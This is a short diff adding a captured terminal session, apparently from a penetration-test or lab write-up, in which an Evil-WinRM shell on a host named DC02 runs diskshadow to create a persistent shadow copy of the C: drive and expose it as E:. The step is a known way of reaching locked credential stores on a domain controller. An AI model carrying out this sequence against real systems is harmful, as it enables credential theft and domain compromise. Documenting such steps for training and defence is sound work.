@@ -1,0 +1,19 @@
+*Evil-WinRM* PS C:\temp> diskshadow /s $script
+Microsoft DiskShadow version 1.0
+Copyright (C) 2013 Microsoft Corporation
+On computer:  DC02,  4/18/2024 11:02:36 AM
+
+-> set verbose on
+-> set metadata C:\Windows\Temp\meta.cab
+-> set context clientaccessible
+-> set context persistent
+-> begin backup
+-> add volume C: alias cdrive
+-> create
+<-SNIP->
+Number of shadow copies listed: 1
+-> expose %cdrive% E:
+-> %cdrive% = {83f86601-79af-4491-a16d-2e02a227ec8f}
+The shadow copy was successfully exposed as E:\.
+-> end backup
+-> exit
